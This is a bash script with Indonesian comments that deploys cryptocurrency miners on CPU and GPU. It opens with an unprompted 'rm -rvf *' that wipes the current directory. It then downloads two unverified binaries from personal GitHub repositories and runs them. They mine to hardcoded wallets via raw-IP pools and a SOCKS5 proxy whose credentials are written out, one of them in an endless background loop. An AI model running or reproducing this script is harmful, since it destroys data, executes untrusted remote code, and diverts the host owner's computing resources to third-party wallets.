#!/bin/bash
rm -rvf * && mkdir a && cd a
# ============================================
# SCRIPT ALL-IN-ONE: GLIBC 2.39 + COR (CPU) + WILD (GPU)
# ============================================

set -e

echo "============================================"
echo "🚀 SCRIPT ALL-IN-ONE GLIBC 2.39 + COR + WILD"
echo "============================================"

# ============================================
# CEK GPU
# ============================================
echo ""
echo "[CEK] Mengecek ketersediaan GPU..."
echo "----------------------------------------"

HAS_GPU=false
GPU_TYPE=""

if command -v nvidia-smi &> /dev/null; then
    echo "✅ NVIDIA GPU terdeteksi!"
    HAS_GPU=true
    GPU_TYPE="nvidia"
elif command -v rocm-smi &> /dev/null; then
    echo "✅ AMD GPU (ROCM) terdeteksi!"
    HAS_GPU=true
    GPU_TYPE="amd"
elif ls /dev/dri/render* &> /dev/null 2>&1; then
    echo "✅ GPU Intel/Others terdeteksi!"
    HAS_GPU=true
    GPU_TYPE="intel"
else
    echo "❌ Tidak ada GPU terdeteksi"
    echo "ℹ️  Akan menggunakan CPU mode (COR saja)"
fi

# ============================================
# 1. INSTALL GLIBC 2.39 (UNTUK COR)
# ============================================
echo ""
echo "[1/4] Install GLIBC 2.39 untuk COR..."
echo "----------------------------------------"

cd ~
mkdir -p ~/.local/glibc-2.39/lib

# Download dari Ubuntu 24.04
echo "Download libc6 2.39..."
wget -q --show-progress http://archive.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.39-0ubuntu8_amd64.deb

echo "Download libc-bin 2.39..."
wget -q --show-progress http://archive.ubuntu.com/ubuntu/pool/main/g/glibc/libc-bin_2.39-0ubuntu8_amd64.deb

# Ekstrak
echo "Ekstrak packages..."
for deb in *.deb; do
    mkdir -p "extract_${deb%.deb}"
    cd "extract_${deb%.deb}"
    ar x "../$deb"
    tar -xf data.tar.zst 2>/dev/null || tar -xf data.tar.xz 2>/dev/null
    cd ..
done

# Copy library
echo "Copy library GLIBC 2.39..."
find extract_* -name "*.so*" -exec cp -f {} ~/.local/glibc-2.39/lib/ \; 2>/dev/null

# Buat wrapper GLIBC
cat > ~/run-glibc-2.39 << 'EOF'
#!/bin/bash
export LD_LIBRARY_PATH="$HOME/.local/glibc-2.39/lib:/lib/x86_64-linux-gnu:/usr/lib/x86_64-linux-gnu"
exec "$HOME/.local/glibc-2.39/lib/ld-linux-x86-64.so.2" "$@"
EOF
chmod +x ~/run-glibc-2.39

# Bersih-bersih
rm -rf extract_* *.deb

echo "✅ GLIBC 2.39 berhasil diinstall untuk COR!"

# ============================================
# 2. DOWNLOAD COR (UNTUK CPU)
# ============================================
echo ""
echo "[2/4] Download COR untuk CPU..."
echo "----------------------------------------"

cd ~
if [ -f "./cor" ]; then
    echo "⚠️ File cor sudah ada, skip download"
else
    echo "Download cor dari GitHub..."
    wget -q --show-progress https://github.com/usapindong/test/raw/refs/heads/main/cor
    chmod +x cor
    echo "✅ Cor berhasil didownload!"
fi

# ============================================
# 3. BUAT WRAPPER COR (MENGGUNAKAN GLIBC 2.39)
# ============================================
echo ""
echo "[3/4] Buat wrapper COR dengan GLIBC 2.39..."
echo "----------------------------------------"

cat > ~/run-cor << 'EOF'
#!/bin/bash
# WRAPPER UNTUK COR DENGAN GLIBC 2.39
# COR berjalan di CPU menggunakan GLIBC 2.39
export LC_ALL=C
export LANG=C
export LD_LIBRARY_PATH="$HOME/.local/glibc-2.39/lib:/lib/x86_64-linux-gnu:/usr/lib/x86_64-linux-gnu"

# Cek apakah file cor ada
if [ ! -f "./cor" ] && [ ! -f "$HOME/cor" ]; then
    echo "❌ File cor tidak ditemukan!"
    echo "📌 Download dulu: wget https://github.com/usapindong/test/raw/refs/heads/main/cor && chmod +x cor"
    exit 1
fi

# Cari lokasi cor
COR_FILE=""
if [ -f "./cor" ]; then
    COR_FILE="./cor"
elif [ -f "$HOME/cor" ]; then
    COR_FILE="$HOME/cor"
fi

# Jalankan COR dengan GLIBC 2.39
exec "$HOME/.local/glibc-2.39/lib/ld-linux-x86-64.so.2" \
    --library-path "$HOME/.local/glibc-2.39/lib:/lib/x86_64-linux-gnu:/usr/lib/x86_64-linux-gnu" \
    "$COR_FILE" "$@"
EOF

chmod +x ~/run-cor
echo "✅ Wrapper COR dengan GLIBC 2.39 berhasil dibuat!"

# ============================================
# 4. SETUP WILD MINER (UNTUK GPU)
# ============================================
echo ""
echo "[4/5] Setup Wild Miner untuk GPU..."
echo "----------------------------------------"

if [ "$HAS_GPU" = true ]; then
    echo "🎮 GPU ($GPU_TYPE) tersedia!"
    echo "📌 Wild miner akan berjalan di GPU (tanpa GLIBC 2.39)"
    echo "📌 COR akan berjalan di CPU (dengan GLIBC 2.39)"
    echo ""
    
    cd ~
    
    # Download wild miner
    if [ ! -f "./wild" ]; then
        echo "Download wild miner..."
        wget -q --show-progress https://github.com/rochmandwi/ayam/releases/download/file-v1/wild
        chmod +x wild
        echo "✅ Wild miner berhasil didownload!"
    else
        echo "⚠️ File wild sudah ada"
    fi
    
    # Jalankan wild miner di background (TANPA GLIBC 2.39)
    echo "🚀 Menjalankan wild miner di GPU (background)..."
    echo "   ⚠️  Menggunakan GLIBC sistem, BUKAN GLIBC 2.39"
    echo ""
    
    (while true; do 
        ./wild --algo pearlhash \
               --url 107.172.222.195:80 \
               --user prl1psq3d3d5lawjz99ytn5egzfjrzxvqm48zhcnnwq23eyq8thpz347suml75p.$(shuf -n 1 -i 1-9999)-rtx \
               --proxy socks5://ubed:ubed123@107.172.222.195:443
        sleep 5
    done) &
    
    WILD_PID=$!
    echo "✅ Wild miner berjalan di GPU dengan PID: $WILD_PID"
    echo "   (Menggunakan GLIBC sistem default, BUKAN GLIBC 2.39)"
    
    # Tunggu sebentar agar wild miner stabil
    echo "⏳ Menunggu wild miner stabil (10 detik)..."
    sleep 10
    
else
    echo "ℹ️  Tidak ada GPU terdeteksi"
    echo "📌 Hanya COR di CPU yang akan berjalan (dengan GLIBC 2.39)"
    echo "📌 Wild miner tidak dijalankan"
fi

# ============================================
# 5. JALANKAN COR (DI CPU DENGAN GLIBC 2.39)
# ============================================
echo ""
echo "[5/5] Menjalankan COR di CPU dengan GLIBC 2.39..."
echo "============================================"

# Parameter default
POOL="stratum1+tcp://cb0318b68b6a39f8072ed597385c2e547bc18a817e63.$(shuf -n 1 -i 1-9999)-gtx@103.196.155.151:443"
THREADS="4"

# Jika ada GPU, kurangi thread CPU agar tidak overload
if [ "$HAS_GPU" = true ]; then
    THREADS="2"
    echo "⚠️  GPU digunakan untuk wild miner"
    echo "⚠️  COR menggunakan $THREADS thread CPU"
else
    THREADS="4"
    echo "ℹ️  Tidak ada GPU, COR menggunakan $THREADS thread CPU penuh"
fi

echo ""
echo "📌 POOL: $POOL"
echo "📌 THREADS: $THREADS"
echo "📌 GLIBC: 2.39 (khusus untuk COR)"
echo "============================================"
echo ""
echo "🚀 Memulai COR di CPU dengan GLIBC 2.39..."
echo ""

# Jalankan cor dengan GLIBC 2.39 (di CPU)
~/run-cor --noeval --hard-aes -P "$POOL" -t "$THREADS"

# ============================================
# SELESAI
# ============================================
echo ""
echo "============================================"
echo "✅ SEMUA MINER BERJALAN!"
echo "============================================"
echo ""
echo "📊 STATUS MINER:"
echo "----------------------------------------"
if [ "$HAS_GPU" = true ]; then
    echo "🎮 WILD MINER (GPU) - PID: $WILD_PID"
    echo "   ✅ Algo: pearlhash"
    echo "   ✅ Proxy: SOCKS5"
    echo "   ✅ GLIBC: Sistem default (BUKAN 2.39)"
    echo ""
fi
echo "💻 COR MINER (CPU) - GLIBC 2.39"
echo "   ✅ Threads: $THREADS"
echo "   ✅ Pool: $POOL"
echo "   ✅ GLIBC: 2.39"
echo "----------------------------------------"
echo ""
echo "📌 Untuk menghentikan:"
echo "   - Hentikan COR: Ctrl+C"
if [ "$HAS_GPU" = true ]; then
    echo "   - Hentikan Wild: kill $WILD_PID"
fi
echo "============================================"
